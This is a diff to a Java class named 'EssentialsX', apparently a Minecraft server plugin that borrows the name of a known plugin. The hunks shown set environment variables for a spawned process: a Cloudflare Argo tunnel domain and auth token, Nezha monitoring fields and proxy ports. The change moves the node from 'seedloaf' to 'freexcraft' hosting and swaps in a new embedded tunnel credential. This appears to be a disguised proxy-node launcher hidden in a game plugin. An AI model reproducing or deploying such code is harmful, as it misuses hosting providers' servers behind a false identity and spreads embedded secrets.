@@ -73,14 +73,14 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "2dfd9865-59bf-4cbe-8de5-1c3a4763b905");
+        env.put("UUID", "c1d03610-30d9-42e2-8054-4ed0c8e846e2");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "seedloaf.19861123.tech");
-        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiOTI5MmRmNWQtODU1Zi00MDAyLWEzMDUtODg5MDUxNWE4NDIyIiwicyI6IlpqQmlZek14TjJVdE5UaGpZaTAwTnpNeUxUaGxZemt0TmpGak56bGlaVGc1WWpjMiJ9");
+        env.put("ARGO_DOMAIN", "freexcraft.19861123.tech");
+        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYzdiOWJkYzUtNmFiYi00YTYxLWIwODMtNWNiZGE4YTU5OWNkIiwicyI6Ik5USTRZamhoT0dRdFpHRXdNeTAwWWpBNUxUZzJOV1V0WkRSbE5tSmlOakF3TURNeiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "seedloaf");
+        env.put("NAME", "freexcraft");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
